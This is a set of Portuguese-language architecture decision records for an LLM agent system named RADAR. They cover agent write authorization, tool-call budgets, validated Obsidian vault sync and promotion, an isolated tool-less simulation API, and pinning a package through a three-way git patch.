Decisão de autoridade: mutação aceita somente busca única, escolha persistida pela aplicação ou ID digitado pelo usuário no turno atual. Uma leitura escolhida pelo modelo após busca ambígua e as referências de conversa nunca autorizam escrita. Alvo, executor e evidência são validados por papel e tipo.

Continuidade e confiança: referências confirmadas têm TTL e entram como resultado de tool não confiável, sem interpolação de ABox em mensagem de sistema. Fatos atuais exigem releitura. Perguntas e recibos vêm do snapshot persistido; delegação é descrita como proposta aguardando aceite.

Trade-off: o pacote 0.3.0 não normaliza diacríticos. O host complementa a busca com uma varredura autorizada de até 100 resumos; isso gera uma observação extra e deixa uma correção futura no pacote. Detalhes em 032 · Interação humana com o RADAR.

ADR-024 · Consultas avançadas reduzem rodadas antes de elevar limites

Problema concreto: T04, T10 e T12 esgotaram o limite de recursão do LangGraph ao procurar pessoas, riscos, decisões e indicadores um por vez. Apenas elevar o limite aumentaria custo e adiaria a mesma falha; deixar cada composição no prompt manteria o comportamento não determinístico.

Decisão: publicar radar_resolve_entities, que agrupa até oito referências sem escolher candidatos, e radar_get_operational_brief, que faz uma leitura de grafo e classifica a visão de uma âncora. Depois disso o teto de passos passa de 25 para 50, acompanhado de middleware independente: no máximo 16 tools e duas chamadas com o mesmo nome e argumentos.

mensagem multifato
  → lote/briefing limitado
  → menos turnos modelo-tool
  → orçamento independente
  → métricas sem prosa

Auditoria: cada AgentRun registra passos, totais, chamadas RADAR, hashes de argumentos repetidos e causa terminal. GraphRecursionError vira agent_step_limit; a resposta pública explica que o pedido deve ser dividido, sem atribuir a falha aos dados ou afirmar alteração.

Trade-off: o batch ainda faz observações internas limitadas porque o pacote não tem busca pública multi-referência. Ele continua sendo uma única tool do ponto de vista do agente e nunca concede proveniência de escrita. A homologação com provider real permanece necessária antes de concluir a qualidade da resposta. Detalhes em 037 · Resiliência das consultas avançadas.

ADR-025 · ABox sincronizada entra por promoção validada, não por escrita no ativo

Problema concreto: o preflight validava a ABox apenas no startup. Obsidian Sync, seed ou restore podiam alterar o mount depois disso, introduzir IDs duplicados e deixar o runtime anunciando ready até uma consulta falhar genericamente.

Decisão de runtime: cada instância guarda uma geração baseada no manifest das notas. Antes de observar, preparar ou executar, mudança de geração dispara o Vault.validate() normativo e reaplica schema, identidade e contexto. Erro muda o estado para degraded, bloqueia reads/writes e publica somente vault_changed_invalid e contagens.

Decisão operacional: Obsidian Headless escreve somente em staging. Com Fully Synced e o agente parado, a CLI copia um snapshot estável, rejeita symlinks, valida o candidate, incorpora o estado .radar ativo, cria backup completo e promove por rename no mesmo filesystem. Restore percorre o mesmo gate. Nenhum fluxo renumera IDs automaticamente.

Sync → staging → snapshot → validate
                            ├─ falha → ativo intacto
                            └─ passa → backup ABox + .radar → promote → reload

Saída segura: CLI, health e logs recebem apenas status, códigos enumerados, versões e contagens. Paths, títulos, IDs e mensagens de validação não cruzam o limite. A conversa aplica a mesma tese: nomes internos da superfície são removidos por código, não apenas por prompt.

Trade-off: promoção exige espaço para candidate e backup, downtime curto e operação explícita. Em troca, sincronização parcial nunca vira a fonte viva e rollback preserva auditoria, receipts e journals. Detalhes em 039 · Linguagem pública e integridade RADAR.

ADR-026 · API sintética isolada para o cos-mariana

Problema concreto: o simulador já possui um cliente HTTP RADAR, mas o Personal-CoS só aceitava Telegram. Reutilizar diretamente a rota Telegram exigiria inventar updates e enviaria respostas ao chat real. Reutilizar o agente principal permitiria que cenários hipotéticos criassem tarefas, drafts ou lembretes de verdade.

Decisão: implementar o contrato `/v1/threads` em uma interface separada. Um segredo Bearer compartilhado com pelo menos 32 caracteres autentica criação e consulta; o `Idempotency-Key`, o id da mensagem e o hash do payload são persistidos antes da inferência. Cada sessão ganha thread e auditoria próprias. O agente de simulação não recebe tools, subagentes, memória, workspace nem integração pessoal.

cos-mariana → Bearer → API RADAR
                         ↓ identidade vinculada à sessão
                  agent sem tools
                         ↓ resposta confirmada
                  histórico + run + ledger

Falhas e duplicidade: uma resposta concluída é repetida literalmente em novo POST ou no endpoint de status. Uma mensagem ainda em processamento não inicia outro run. Depois de cinco minutos sem conclusão, seu estado passa a unknown; o código não reexecuta a inferência por conta própria. Isso protege contra execução duplicada e conserva a diferença entre falha e resultado conhecido.

Alternativas descartadas: usar o webhook Telegram misturaria protocolo e identidade; chamar process_telegram_update acoplaria o teste ao envio para o chat real; publicar tools read-only ainda exporia tarefas, agenda ou e-mail pessoais a conteúdo sintético. O modo de simulação responde com aconselhamento textual e sem acesso aos sistemas reais.

Trade-off: essa interface não mede o comportamento do agente operacional completo; ela mede uma resposta textual do modelo isolada. O smoke de uma mensagem é opt-in porque chama um modelo real e cria uma sessão persistente. A compatibilidade com o deployment só é confirmada depois de configurar o mesmo `RADAR_API_KEY` nos dois projetos e executar o smoke. Detalhes em 028 · API RADAR para cos-mariana.

Como revisar uma decisão

  1. Registrar o problema concreto que tornou a decisão insuficiente.
  2. Atualizar o teste de contrato antes ou junto da implementação.
  3. Explicar a nova alternativa e seus trade-offs.
  4. Atualizar as páginas de desenvolvimento afetadas e o TASK_LIST.md.

ADR-027 · O domínio RADAR entra no JMR por patch de três vias e pacote pinado

Problema concreto: o JMR_Personal-CoS é a linha de uso real e precisava operar o vault RADAR, que só existia no RADAR-CoS-v1. Os dois descendem do mesmo template.

Decisão: reaplicar sobre o JMR a diferença entre o template (b8d89be) e o RADAR-CoS-v1 (cdf1ef9) com git apply --3way, resolver os nove conflitos à mão e instalar radar-vault do JMR_RADAR_ONTOLOGY no commit 5f85264 (0.5.0), com o token do GitHub apenas como secret de build. O pino inicial foi o 405aab8 (0.4.0), trocado ao validar o vault real, escrito pelo 0.5.0.

Alternativas descartadas: duplicar o RADAR-CoS-v1 criaria uma terceira linha de código; copiar arquivos perderia a rastreabilidade; apontar para a branch main deixaria o build mudar sem aviso; o 0.4.0 rejeita o vault real (relations com target_id e nomes de arquivo humanos).

Trade-off: JMR e RADAR-CoS-v1 passam a divergir e correções precisam ser portadas de propósito. O RADAR-CoS-v1 continua no 0.4.0.

Decisões revisadas em 01/10/2026: integração RADAR portada ao JMR_Personal-CoS (ADR-020 a 025) API sintética do M10 renumerada como ADR-026 e ADR-027 sobre a forma da integração.
